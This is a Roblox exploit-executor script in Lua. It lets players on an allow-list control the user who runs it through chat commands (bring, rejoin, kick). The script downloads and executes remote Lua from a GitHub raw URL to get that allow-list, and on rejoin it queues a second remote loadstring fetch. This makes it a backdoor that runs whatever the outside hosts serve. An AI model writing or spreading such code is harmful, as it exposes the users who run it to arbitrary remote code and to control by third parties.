local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6hfeuopteafumbvyue507421.lua"
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local allowedUserIds = {}

-- Wait for the game to fully load
local function ensureGameLoaded()
    if not game:IsLoaded() then
        print("Waiting for the game to fully load...")
        game.Loaded:Wait()
    end
end

-- Load allowed user IDs safely
local success, result = pcall(function()
    return loadstring(game:HttpGet(url))()
end)

if success then
    allowedUserIds = result
else
    warn("Failed to load allowed User IDs:", result)
end

-- Wait for a player's character to load robustly
local function waitForCharacter(player)
    if player.Character and player.Character.Parent then
        return player.Character
    end

    -- Wait for the CharacterAdded event
    local character = nil
    repeat
        character = player.Character or player.CharacterAdded:Wait()
        task.wait() -- Avoid potential infinite loops
    until character and character.Parent

    return character
end

-- Ensure LocalPlayer's character is loaded
local function ensureLocalPlayerCharacter()
    if not LocalPlayer.Character or not LocalPlayer.Character.Parent then
        print("Waiting for LocalPlayer's character...")
        waitForCharacter(LocalPlayer)
    end
end

-- Check if a player is allowed
local function isAllowed(player)
    for _, allowedId in ipairs(allowedUserIds) do
        if tostring(player.UserId) == tostring(allowedId) then
            return true
        end
    end
    return false
end

-- Bring executor to caller's location
local function bringExecutorToCaller(caller)
    local callerCharacter = waitForCharacter(caller)
    local executorCharacter = waitForCharacter(LocalPlayer)
    local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
    local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
    if callerHRP and executorHRP then
        executorHRP.CFrame = callerHRP.CFrame
    else
        warn("HumanoidRootPart is missing for caller or executor.")
    end
end

-- Rejoin the current server
local function rejoinExecutor()
    if queue_on_teleport then
        queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Estplugs/test/refs/heads/main/lua"))()')
    end
    local currentJobId = game.JobId
    TeleportService:TeleportToPlaceInstance(PlaceId, currentJobId, LocalPlayer)
end

-- Kick the executor
local function kickExecutor()
    local character = waitForCharacter(LocalPlayer)
    if character then
        LocalPlayer:Kick("You have been kicked by an allowed player.")
    else
        warn("Failed to kick: Character is not loaded.")
    end
end

-- Attach a chat listener to a player
local function attachChatListener(player)
    player.Chatted:Connect(function(message)
        if isAllowed(player) then
            if message == "?bring" then
                bringExecutorToCaller(player)
            elseif message == "?rj" then
                rejoinExecutor()
            elseif message == "?kick" then
                kickExecutor()
            end
        end
    end)
end

-- Attach listeners to existing players
local function checkExistingPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        attachChatListener(player)
    end
end

-- Initialize script with robust game and LocalPlayer character handling
ensureGameLoaded()
ensureLocalPlayerCharacter()

checkExistingPlayers()

Players.PlayerAdded:Connect(function(player)
    attachChatListener(player)
end)

RunService.Heartbeat:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if isAllowed(player) then
            break
        end
    end
end)

print("Script loaded successfully. Waiting for commands...")
